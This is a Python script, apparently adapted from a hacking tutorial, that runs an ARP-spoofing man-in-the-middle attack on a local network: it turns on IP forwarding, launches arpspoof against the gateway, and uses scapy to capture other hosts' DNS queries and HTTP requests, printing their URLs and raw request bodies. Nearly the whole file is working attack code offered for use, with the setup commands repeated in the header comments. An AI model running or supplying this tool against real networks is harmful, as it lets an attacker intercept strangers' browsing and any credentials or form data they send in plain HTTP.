# Largely inspired by https://null-byte.wonderhowto.com/how-to/build-dns-packet-sniffer-with-scapy-and-python-0163601/
# Before launching this python script, be sure to run :
# echo "1" > /proc/sys/net/ipv4/ip_forward
# arpspoof -i eth0 -t 192.168.1.1 # (Gateway IP address if you're on a LAN)
# This script allows to exclude another ip address than the local one that is already excluded : In variable ip_exclude (if not empty)
# It allows also to define a default interface : In variable default_interface (if not empty)
# This version skips one packet out of 2 because they are logged twice by default (cf. https://stackoverflow.com/questions/52232080/scapy-sniff-the-packet-multiple-times)
# You might need to "pip install netifaces" if you get error "ImportError: No module named netifaces"

# coding: utf-8

from pip._vendor.distlib.compat import raw_input
from scapy.all import *
import sys
import os

from scapy.layers.dns import DNS
from scapy.layers.inet import IP
from scapy.layers.http import HTTPRequest


import netifaces as ni

ip_gateway = "192.168.10.254"

default_interface = "eth0"
ip_exclude = "192.168.10.33"

if default_interface != "":
    interface = default_interface

if default_interface == "":
    try:
        interface = raw_input("[*] Enter desired Interface : ")
    except KeyboardInterrupt:
        print("[*] User Requests Shutdown")
        print("[*] Exiting")
        sys.exit(1)

os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
os.system("arpspoof -i " + interface + " " + ip_gateway + " > /dev/null 2>&1 &")

# get local ip address
ni.ifaddresses(interface)
ip_local = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']

# une première IP à exclure est notre ip locale
print("1st IP to exclude from src = Local IP = ", ip_local)
# on peut aussi exclure une deuxième adresse ip
if ip_exclude != "":
    print("2nd IP to exclude from src = ", ip_exclude)

skipPacket = False


def query_sniff(pkt):
    global skipPacket
    if IP in pkt:
        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst
        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
            if (ip_src != ip_local) and (ip_src != ip_exclude) and (ip_dst != "192.168.10.117"):
                if not skipPacket:
                    print(ip_src + " -> " + ip_dst + " : " + "(" + str(pkt.getlayer(DNS).qd.qname) + ")")
                    skipPacket = True
                else:
                    skipPacket = False
        else:
            if (ip_src != ip_local) and (ip_src != ip_exclude) and (ip_dst != "192.168.10.117"):
                if pkt.haslayer(HTTPRequest):
                    print(ip_src + " -> " + ip_dst + " : " + str(pkt))
                    method = pkt[HTTPRequest].Method.decode()
                    url = pkt[HTTPRequest].Host.decode() + pkt[HTTPRequest].Path.decode()
                    print(method + " " + url)
                    if pkt.haslayer(Raw):
                        print(pkt[Raw].load)
                else:
                    # print(ip_src + " -> " + ip_dst + " : " + str(pkt))
                    pass


sniff(iface=interface, filter="port 80", prn=query_sniff, store=0)
# sniff(iface=interface, filter="", prn=query_sniff, store=0)
print("\n[*] Shutting Down...")
